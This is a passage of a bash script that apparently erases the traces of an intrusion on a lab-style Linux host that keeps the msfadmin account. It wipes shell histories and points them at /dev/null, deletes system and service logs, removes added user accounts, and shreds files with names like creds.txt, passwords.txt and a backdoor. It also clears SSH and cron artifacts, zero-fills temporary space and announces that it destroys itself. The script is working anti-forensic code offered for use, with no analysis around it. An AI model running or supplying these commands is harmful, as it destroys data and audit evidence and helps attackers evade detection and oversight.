...
echo "[*] Wiping all bash/zsh histories..."
for home in /root /home/*; do
    [ -d "$home" ] || continue
    rm -f "$home/.bash_history" "$home/.bash_logout" "$home/.zsh_history" "$home/.zshrc" 2>/dev/null
    ln -sf /dev/null "$home/.bash_history" 2>/dev/null
done
history -c; unset HISTFILE; export HISTSIZE=0

echo "[*] Wiping all system logs..."
cd /var/log 2>/dev/null || cd /var || cd /
...
rm -f /var/log/apache2/access.log /var/log/apache2/error.log 2>/dev/null
rm -f /var/log/proftpd/proftpd.log 2>/dev/null
rm -f /var/log/mysql/error.log /var/log/mysql/mysql.log 2>/dev/null
rm -f /var/log/postgresql/postgresql.log 2>/dev/null
rm -f /var/log/samba/*.log 2>/dev/null
rm -f /var/log/*.gz /var/log/*.1 /var/log/*.old 2>/dev/null

echo "[*] Removing all non-default users (UID>=1000)..."
for user in $(awk -F: '$3>=1000 && $3<65534 {print $1}' /etc/passwd 2>/dev/null); do
    # Keep only original msfadmin/service/user/ftp
    case "$user" in
        msfadmin|user|service|ftp) continue ;;
    esac
    pkill -u "$user" 2>/dev/null
    userdel -r "$user" 2>/dev/null
    rm -f "/etc/sudoers.d/$user" 2>/dev/null
done

echo "[*] Shredding all suspicious files..."
shred -zun 3 /tmp/bashdoor /tmp/cc.txt /tmp/creds.txt /dev/shm/root.hash /tmp/passwords.txt /tmp/*.sh 2>/dev/null
rm -rf /tmp/.stash /tmp/.hidden* /tmp/.cache* /tmp/.wipe /dev/shm/.wipe 2>/dev/null
...
echo "[*] Cleaning cron, SSH keys, system configs..."
...
rm -f /usr/local/bin/autowipe.sh 2>/dev/null
for home in /root /home/*; do
    [ -d "$home/.ssh" ] && {
...
dd if=/dev/zero of=/tmp/.wipe bs=1M count=10 2>/dev/null; rm -f /tmp/.wipe 2>/dev/null
dd if=/dev/zero of=/dev/shm/.wipe bs=1M count=10 2>/dev/null; rm -f /dev/shm/.wipe 2>/dev/null

echo "[+] Cleanup complete. Self-destructing..."

# Self-destruct: shred all traces of this script, then kill shell
